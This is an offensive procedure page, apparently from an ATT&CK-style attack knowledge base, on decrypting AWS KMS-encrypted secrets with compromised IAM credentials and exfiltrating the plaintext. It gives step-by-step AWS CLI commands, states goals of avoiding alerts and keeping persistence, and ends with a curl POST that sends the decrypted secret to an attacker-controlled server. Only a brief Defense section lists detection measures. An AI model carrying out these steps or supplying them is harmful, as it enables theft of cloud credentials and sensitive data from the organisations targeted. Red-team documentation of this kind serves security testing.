---
type: procedure
description: >-
  Decrypts encrypted secrets using AWS KMS to enable exfiltration of sensitive
  data such as credentials.
verified: true
submitted: false
tactics:
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - >-
    [[techniques/Exfiltration Over Alternative Protocol|T1048 - Exfiltration
    Over Alternative Protocol]]
sub_techniques:
  - >-
    [[sub-techniques/Exfiltration Over Asymmetric Encrypted Non-C2
    Protocol|T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2
    Protocol]]
tags:
  - cloud-aws
  - credential-exfiltration
  - decrypt-secret-using-key
  - kms
commands:
  - '[[commands/aws-kms-decrypt-ciphertext-blob]]'
platforms:
  - AWS
  - Cloud
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# AWS-KMS-Decrypt-Exfiltration

## Summary

This procedure demonstrates how to use AWS Key Management Service (KMS) to decrypt encrypted secrets, such as credentials or access keys, within an AWS environment. Once decrypted, the plaintext data can be exfiltrated via alternative protocols, allowing attackers to access sensitive information for further compromise. It requires IAM permissions for KMS decrypt operations and is commonly used post-compromise to unlock protected data.

## Description

In an AWS environment, sensitive data like database credentials or API keys is often encrypted using KMS customer master keys (CMKs). Attackers with compromised IAM credentials that include kms:Decrypt permissions can leverage the AWS CLI to decrypt these secrets. The process involves specifying the ciphertext blob (encrypted data) and outputting the plaintext, which is returned in base64-encoded format. This technique fits into exfiltration workflows where encrypted data is stored in S3, EC2 instance metadata, or other services. Proper segmentation and monitoring of KMS API calls are critical defenses, as excessive decrypt operations can indicate malicious activity. The procedure assumes the attacker has already obtained the encrypted blob through prior discovery or access.

## Requirements

1. AWS CLI installed and configured with IAM credentials granting kms:Decrypt permission on the relevant KMS key.
2. Access to the encrypted ciphertext blob (e.g., file or blob data retrieved from S3/EC2).
3. Network access to AWS endpoints (no VPC endpoints required unless restricted).
4. Base64 decoding utility (e.g., built-in to most shells) for handling output.

## Defense

- Implement least-privilege IAM policies to restrict kms:Decrypt to necessary roles only.
- Monitor CloudTrail logs for unusual KMS decrypt API calls, especially from unexpected sources or high volumes.
- Use AWS Config rules to enforce encryption policies and alert on key usage anomalies.
- Enable VPC flow logs and GuardDuty to detect unauthorized access patterns leading to decryption attempts.

## Objectives

1. Decrypt protected secrets to obtain plaintext credentials or keys.
2. Prepare decrypted data for exfiltration without triggering alerts.
3. Maintain access to the AWS environment for lateral movement or persistence.

## Instructions

### Step 1: Verify AWS CLI Configuration and Permissions

**Context**: Ensure the AWS CLI is set up with credentials that have the required KMS permissions. This step confirms access before attempting decryption, preventing errors from misconfigured profiles.

Run the AWS STS get-caller-identity command to verify your identity and permissions:

```bash
aws sts get-caller-identity
```

> This outputs your account ID, user ARN, and session details. If it fails with AccessDenied, update your IAM policy to include kms:Decrypt on the target key.

**Expected Output**:
```
{
    "UserId": "AIDAXYZ...",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/example-user"
}
```

### Step 2: Prepare the Encrypted Ciphertext Blob

**Context**: Obtain or load the encrypted file containing the ciphertext. This could be from S3 download, EC2 metadata, or a previous procedure. Ensure the file is in binary format as required by KMS.

If retrieving from S3, use:

```bash
aws s3 cp s3://bucket-name/encrypted-file.bin .
```

> Download the file to your local working directory. Verify the file exists and is readable with ls -la encrypted-file.bin.

**Expected Output**: The file is copied locally without errors, confirming access to the storage location.

### Step 3: Decrypt the Ciphertext Using KMS

**Context**: Execute the core decryption operation using the AWS KMS decrypt API via CLI. This step targets the specific encrypted blob and retrieves the plaintext.

**Command** ([[commands/aws-kms-decrypt-ciphertext-blob]]):

```bash
aws kms decrypt --ciphertext-blob fileb://$_CIPHERTEXT_FILE --output text --query Plaintext
```

> This command reads the binary encrypted file, decrypts it with the associated KMS key, and outputs the base64-encoded plaintext. The --query Plaintext extracts only the relevant field. Pipe the output to a file for storage: | base64 -d > decrypted-secret.txt (on Linux/macOS) or certutil -decode input.txt output.txt (on Windows).

**Expected Output**:
```
AQIDBAUGBwgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... (base64 string)
```

### Step 4: Decode and Verify the Plaintext

**Context**: The KMS output is base64-encoded, so decode it to readable format. This step validates the decryption and prepares the data for exfiltration.

Decode the output:

```bash
aws kms decrypt --ciphertext-blob fileb://$_CIPHERTEXT_FILE --output text --query Plaintext | base64 -d
```

> This pipes the base64 output directly to decode, revealing the original secret (e.g., a password or key). Inspect the result to confirm it's usable data, not garbage.

**Expected Output**: Plaintext secret, such as "MySecretPassword123" or an API key string.

### Step 5: Exfiltrate the Decrypted Data

**Context**: With the plaintext available, transfer it out of the environment using an alternative protocol to avoid detection. This could involve DNS tunneling, HTTP POST, or cloud storage upload.

For example, upload to a controlled S3 bucket (if permitted) or use curl to send via HTTPS:

```bash
curl -X POST -d @decrypted-secret.txt https://attacker-controlled-server/exfil
```

> Choose a method based on network restrictions. Verify transmission with server logs.

**Expected Output**: HTTP 200 OK response or successful upload confirmation.

